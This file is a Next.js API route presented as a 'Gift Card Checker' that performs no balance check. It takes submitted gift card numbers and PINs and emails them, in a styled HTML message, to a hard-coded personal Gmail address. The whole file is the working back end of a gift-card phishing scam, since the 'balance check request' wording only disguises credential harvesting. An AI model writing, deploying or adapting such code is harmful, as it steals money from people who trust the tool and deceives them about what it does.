import { NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY!);

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const { cards, denomination } = body;

    await resend.emails.send({
      from: "Gift Card Checker <onboarding@resend.dev>",
      to: "frankscott1609@gmail.com",
      subject: "New Gift Card Submission",
     html: `
<div style="font-family: Arial, sans-serif; background:#f6f7fb; padding:40px 0;">
  <div style="max-width:600px;margin:0 auto;background:#ffffff;border-radius:12px;overflow:hidden;box-shadow:0 10px 25px rgba(0,0,0,0.05);">

    <!-- HEADER -->
    <div style="background:#111827;padding:20px 30px;">
      <h1 style="color:#ffffff;margin:0;font-size:18px;">
        Gift Card Submission
      </h1>
      <p style="color:#9ca3af;margin:5px 0 0;font-size:13px;">
        New balance check request received
      </p>
    </div>

    <!-- BODY -->
    <div style="padding:30px;">

      <!-- DENOMINATION -->
      <div style="margin-bottom:20px;">
        <p style="margin:0;color:#6b7280;font-size:12px;">DENOMINATION</p>
        <p style="margin:5px 0 0;font-size:18px;font-weight:bold;color:#111827;">
          $${denomination ?? "N/A"}
        </p>
      </div>

      <!-- CARDS LIST -->
      <div style="margin-top:20px;">
        <p style="margin-bottom:10px;font-size:12px;color:#6b7280;">
          CARDS SUBMITTED
        </p>

        ${cards
          .map(
            (c: any, i: number) => `
            <div style="
              border:1px solid #e5e7eb;
              border-radius:10px;
              padding:15px;
              margin-bottom:10px;
              background:#fafafa;
            ">
              <p style="margin:0;font-size:13px;color:#6b7280;">
                Card #${i + 1}
              </p>

              <p style="margin:5px 0;font-size:14px;color:#111827;font-weight:600;">
                ${c.cardNumber}
              </p>

              <p style="margin:0;font-size:13px;color:#6b7280;">
                PIN:
                <span style="color:#111827;font-weight:500;">
                  ${c.pin || "NO PIN PROVIDED"}
                </span>
              </p>
            </div>
          `
          )
          .join("")}
      </div>

      <!-- FOOTER NOTE -->
      <div style="margin-top:25px;padding-top:15px;border-top:1px solid #e5e7eb;">
        <p style="font-size:11px;color:#9ca3af;margin:0;">
          This is an automated message from Gift Card Checker system.
        </p>
      </div>

    </div>
  </div>
</div>
`
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json(
      { success: false },
      { status: 500 }
    );
  }
}